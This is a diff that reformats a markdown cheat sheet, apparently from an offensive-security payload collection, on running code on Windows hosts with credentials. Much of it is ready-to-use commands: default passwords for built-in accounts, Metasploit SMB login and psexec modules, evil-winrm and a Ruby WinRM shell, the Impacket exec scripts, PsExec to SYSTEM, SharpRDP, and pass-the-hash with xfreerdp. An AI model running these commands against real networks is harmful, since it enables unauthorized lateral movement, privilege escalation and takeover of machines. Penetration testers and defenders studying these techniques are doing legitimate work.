@@ -2,24 +2,24 @@
 
 ## Summary
 
-* [TIPS](#tips)
-    * [TIP 1 - Create your credential](#tip-1-create-your-credential)
-    * [TIP 2 - Retail Credential](#tip-2-retail-credential)
-    * [TIP 3 - Sandbox Credential - WDAGUtilityAccount](#tip-3-sandbox-credrential-wdagutilityaccount)
-* [Metasploit](#metasploit)
-    * [Metasploit - SMB](#metasploit-smb)
-    * [Metasploit - Psexec](#metasploit-psexec)
-* [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
-* [WinRM](#winrm)
-* [Powershell Remoting](#powershell-remoting)
-* [Crackmapexec](#crackmapexec)
-* [Winexe](#winexe)
-* [WMI](#wmi)
-* [Psexec.py / Smbexec.py / Wmiexec.py](#psexecpy--smbexecpy--wmiexecpy)
-* [PsExec - Sysinternal](#psexec-sysinternal)
-* [RDP Remote Desktop Protocol](#rdp-remote-desktop-protocol)
-* [Netuse](#netuse)
-* [Runas](#runas)
+- [TIPS](#tips)
+  - [TIP 1 - Create your credential](#tip-1-create-your-credential)
+  - [TIP 2 - Retail Credential](#tip-2-retail-credential)
+  - [TIP 3 - Sandbox Credential - WDAGUtilityAccount](#tip-3-sandbox-credrential-wdagutilityaccount)
+- [Metasploit](#metasploit)
+  - [Metasploit - SMB](#metasploit-smb)
+  - [Metasploit - Psexec](#metasploit-psexec)
+- [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
+- [WinRM](#winrm)
+- [Powershell Remoting](#powershell-remoting)
+- [Crackmapexec](#crackmapexec)
+- [Winexe](#winexe)
+- [WMI](#wmi)
+- [Psexec.py / Smbexec.py / Wmiexec.py](#psexecpy--smbexecpy--wmiexecpy)
+- [PsExec - Sysinternal](#psexec-sysinternal)
+- [RDP Remote Desktop Protocol](#rdp-remote-desktop-protocol)
+- [Netuse](#netuse)
+- [Runas](#runas)
 
 ## TIPS
 
@@ -40,11 +40,13 @@ net user /dom
 net user /domain
 ```
 
-### TIP 2 - Retail Credential 
+### TIP 2 - Retail Credential
 
-Retail Credential [@m8urnett on Twitter](https://twitter.com/m8urnett/status/1003835660380172289)
+Retail Credential
+[@m8urnett on Twitter](https://twitter.com/m8urnett/status/1003835660380172289)
 
-when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin
+when you run Windows in retail demo mode, it creates a user named Darrin DeYoung
+and an admin RetailAdmin
 
 ```powershell
 Username: RetailAdmin
@@ -53,9 +55,11 @@ Password: trs10
 
 ### TIP 3 - Sandbox Credential - WDAGUtilityAccount
 
-WDAGUtilityAccount - [@never_released on Twitter](https://twitter.com/never_released/status/1081569133844676608)
+WDAGUtilityAccount -
+[@never_released on Twitter](https://twitter.com/never_released/status/1081569133844676608)
 
-Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard
+Starting with Windows 10 version 1709 (Fall Creators Update), it is part of
+Windows Defender Application Guard
 
 ```powershell
 \\windowssandbox
@@ -63,24 +67,24 @@ Username: wdagutilityaccount
 Password: pw123
 ```
 
-
 ## Metasploit
 
 ### Metasploit - SMB
 
 ```c
-use auxiliary/scanner/smb/smb_login  
-set SMBDomain DOMAIN  
+use auxiliary/scanner/smb/smb_login
+set SMBDomain DOMAIN
 set SMBUser username
 set SMBPass password
-services -p 445 -R  
+services -p 445 -R
 run
 creds
 ```
 
 ### Metasploit - Psexec
 
-Note: the password can be replaced by a hash to execute a `pass the hash` attack.
+Note: the password can be replaced by a hash to execute a `pass the hash`
+attack.
 
 ```c
 use exploit/windows/smb/psexec
@@ -114,8 +118,9 @@ PS C:\> Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock {whoami
 ## WinRM
 
 Require:
-* Port **5985** or **5986** open.
-* Default endpoint is **/wsman**
+
+- Port **5985** or **5986** open.
+- Default endpoint is **/wsman**
 
 ```powershell
 root@payload$ git clone https://github.com/Hackplayers/evil-winrm
@@ -128,7 +133,7 @@ or using a custom ruby code to interact with the WinRM service.
 ```ruby
 require 'winrm'
 
-conn = WinRM::Connection.new( 
+conn = WinRM::Connection.new(
   endpoint: 'http://ip:5985/wsman',
   user: 'domain/user',
   password: 'password',
@@ -138,16 +143,15 @@ command=""
 conn.shell(:powershell) do |shell|
     until command == "exit\n" do
         print "PS > "
-        command = gets        
+        command = gets
         output = shell.run(command) do |stdout, stderr|
             STDOUT.print stdout
             STDERR.print stderr
         end
-    end    
+    end
     puts "Exiting with code #{output.exitcode}"
 end
 ```
-
 
 ## Powershell Remoting
 
@@ -171,8 +175,7 @@ PS> Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }
 PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\Scripts\Task.ps1
 ```
 
-
-## Winexe 
+## Winexe
 
 Integrated to Kali
 
@@ -186,7 +189,7 @@ root@payload$ winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe
 PS C:\> wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”
 ```
 
-## Psexec.py / Smbexec.py / Wmiexec.py 
+## Psexec.py / Smbexec.py / Wmiexec.py
 
 from Impacket
 
@@ -200,10 +203,10 @@ root@payload$ python psexec.py DOMAIN/username:password@10.10.10.10
 # A similar approach to PSEXEC w/o using RemComSvc
 root@payload$ python smbexec.py DOMAIN/username:password@10.10.10.10
 
-# A semi-interactive shell, used through Windows Management Instrumentation. 
+# A semi-interactive shell, used through Windows Management Instrumentation.
 root@payload$ python wmiexec.py DOMAIN/username:password@10.10.10.10
 
-# A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. 
+# A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints.
 root@payload$ python atexec.py DOMAIN/username:password@10.10.10.10
 
 # Executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
@@ -212,18 +215,20 @@ root@payload$ python dcomexec.py DOMAIN/username:password@10.10.10.10
 
 ## PsExec - Sysinternal
 
-from Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
+from Windows -
+[Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
 
 ```powershell
 PS C:\> PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe
 
 # switch admin user to NT Authority/System
-PS C:\> PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s 
+PS C:\> PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s
 ```
 
-## RDP Remote Desktop Protocol 
+## RDP Remote Desktop Protocol
 
-Abuse RDP protocol to execute commands remotely with [SharpRDP](https://github.com/0xthirteen/SharpRDP)
+Abuse RDP protocol to execute commands remotely with
+[SharpRDP](https://github.com/0xthirteen/SharpRDP)
 
 ```powershell
 PS C:\> SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
@@ -235,7 +240,7 @@ Or connect remotely with `rdesktop`
 root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare
 root@payload$ rdesktop -u username -p password -g 70 -r disk:share=/tmp/myshare 10.10.10.10
 # -g : the screen will take up 70% of your actual screen size
-# -r disk:share : sharing a local folder during a remote desktop session 
+# -r disk:share : sharing a local folder during a remote desktop session
 ```
 
 Note: you may need to enable it with the following command
@@ -264,7 +269,7 @@ or with Metasploit
 root@payload$ run getgui -u admin -p 1234
 ```
 
-or with xfreerdp 
+or with xfreerdp
 
 ```powershell
 root@payload$ xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:10.0.0.1 # pass the hash works for Server 2012 R2 / Win 8.1+
@@ -272,7 +277,7 @@ root@payload$ xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D 192.168.226.1
 root@payload$ xfreerd /u:runner /v:10.0.0.1 # password will be asked
 ```
 
-## Netuse 
+## Netuse
 
 Windows only
 
@@ -280,13 +285,12 @@ Windows only
 PS C:\> net use \\ordws01.cscou.lab /user:DOMAIN\username password C$
 ```
 
-## Runas 
+## Runas
 
 ```powershell
 PS C:\> runas /netonly /user:DOMAIN\username "cmd.exe"
 PS C:\> runas /noprofil /netonly /user:DOMAIN\username cmd.exe
 ```
-
 
 ## References
 
